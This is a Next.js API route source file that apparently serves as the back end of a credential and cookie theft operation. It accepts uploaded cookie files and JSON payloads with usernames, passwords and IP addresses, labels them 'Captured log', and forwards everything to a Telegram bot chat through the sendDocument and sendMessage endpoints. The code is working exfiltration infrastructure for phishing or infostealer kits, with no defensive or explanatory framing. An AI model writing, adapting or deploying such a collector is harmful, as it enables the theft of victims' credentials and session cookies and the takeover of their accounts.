import nextConnect from 'next-connect';
import multer from 'multer';
import FormData from 'form-data';

export const config = { api: { bodyParser: false } };
const upload = multer();

const handler = nextConnect();
handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!telegramToken || !chatId) {
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  // File upload (cookies as .txt)
  if (req.file) {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append(
      'document',
      req.file.buffer,
      {
        filename: req.file.originalname || 'cookie.txt',
        contentType: req.file.mimetype || 'text/plain'
      }
    );
    // Optional: Add caption
    const { ip, type } = req.body;
    let caption = '';
    if (ip) caption += `IP: ${ip}\n`;
    if (type) caption += `Type: ${type}\n`;
    if (caption) form.append('caption', caption);

    const tgRes = await fetch(`${botUrl}/sendDocument`, {
      method: 'POST',
      body: form,
      headers: form.getHeaders()
    });
    const tgText = await tgRes.text();
    if (!tgRes.ok) {
      console.error('Telegram API error (file):', tgText);
      return res.status(502).json({ success: false, error: tgText });
    }
    return res.status(200).json({ success: true });
  }

  // JSON logs (creds, etc)
  if (req.headers['content-type']?.includes('application/json')) {
    let body = '';
    await new Promise((resolve, reject) => {
      req.on('data', chunk => body += chunk);
      req.on('end', resolve);
      req.on('error', reject);
    });
    let json;
    try {
      json = JSON.parse(body);
    } catch {
      return res.status(400).json({ success: false, message: 'Invalid JSON' });
    }
    const { data, ip, user, pass, type } = json;
    let text = `📥 Captured log\n`;
    if (ip) text += `IP: ${ip}\n`;
    if (type) text += `Type: ${type}\n`;
    if (data) text += `\n${data}`;
    else if (user && pass) text += `User: ${user}\nPass: ${pass}`;
    else text += JSON.stringify(json, null, 2);

    const tgRes = await fetch(`${botUrl}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    const tgText = await tgRes.text();
    if (!tgRes.ok) {
      console.error('Telegram API error (text):', tgText);
      return res.status(502).json({ success: false, error: tgText });
    }
    return res.status(200).json({ success: true });
  }

  return res.status(400).json({ success: false, message: 'Bad payload' });
});

export default handler;
